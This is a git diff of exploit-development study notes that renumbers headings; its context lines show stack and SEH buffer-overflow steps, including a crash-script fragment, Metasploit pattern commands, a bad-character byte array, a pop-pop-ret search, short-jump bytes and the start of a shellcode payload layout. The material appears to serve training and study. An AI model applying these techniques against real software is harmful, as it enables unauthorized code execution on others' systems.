@@ -1009,7 +1009,7 @@ On the x86 architecture, arguments are pushed to the stack before the call instr
 - https://cheatography.com/chrischurilla/cheat-sheets/intro-to-ida/
 
 # Stack Overflows
-## 1- Crashing The App
+## Crashing The App
 You send a request with huge data input and review the app if crash or no, Sometimes the App may not crash if you didn't send the data at once.
 ### Network Script
 ```
@@ -1065,7 +1065,7 @@ if __name__ == "__main__":
     send_exploit_request()
 ```
 
-## 2- Find Offset
+## Find Offset
 For finding the offset where the `EIP` get overwrited.
 - Create Unique pattern:
 ```
@@ -1076,7 +1076,7 @@ msf-pattern_create -l size
 msf-pattern_offset -l size -q value
 ```
 
-## 3- Detect BadChars
+## Detect BadChars
 ```
 badchars = (
 b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -1134,7 +1134,7 @@ msf-metasm_shell
 We use `sp` to avoid null bytes
 
 # SEH Overflows
-## 1- Crashing The App
+## Crashing The App
 You send a request with huge data input and review the app if crash or no, Sometimes the App may not crash if you didn't send the data at once.
 ## Network Script
 ```
@@ -1190,7 +1190,7 @@ if __name__ == "__main__":
     send_exploit_request()
 ```
 
-## 2- Find Offset
+## Find Offset
 For finding the offset where the `EIP` get overwrited.
 - Create Unique pattern:
 ```
@@ -1226,7 +1226,7 @@ b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\x
 b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 ```
 
-## 4 - P/ P/ R/
+## P/ P/ R/
 Next step is to find the `pop r32; pop r32; ret;`:
 ### Windbg code:
 ```c
@@ -1279,7 +1279,7 @@ for i in opcodes_array:
 print("\n[+] Searching for /P /P /R done ")
 ```
 
-## 5 - `JMP` short bytes
+## `JMP` short bytes
 Now, It's time to `JMP` shortly to avoid invalid instructions and crash.
 - First when `P/ P/ R/` instructions is done, You start to assemble the address using windbg:
 ![1efd3ff87af74e9556ec17a0f41df0dc.png](:/4603c18772584baabba4703ca5e03a71)
@@ -1289,7 +1289,7 @@ Now, It's time to `JMP` shortly to avoid invalid instructions and crash.
 	- 4. We can see in the opcode that the `JMP 0xaddress` translated to `eb08` which means Jump `08` bytes which is gonna jump to the address we provided (later our shellcode).
 	- Finally don't forget to add 2 `\x90` as the address is missing 2 bytes(`\xeb\x08\x90\x90`).
 
-## 6 - Island Hopping
+## Island Hopping
 In island hopping we calcluate the length if bytes between the `esp` and start of our shellcode, That way when we get the value we can add it to `esp/sp` and elemenat it and `JMP` to the `esp` which will be indicating to our shellcode.
 - steps:
 ```
@@ -1303,7 +1303,7 @@ msf-metasm_shell
 ```
 We use `sp` to avoid null bytes
 
-## 7 - Executing shellcode
+## Executing shellcode
 The structure of our payload would be the following
 ```python 
 filler = b"\x41" * (size)
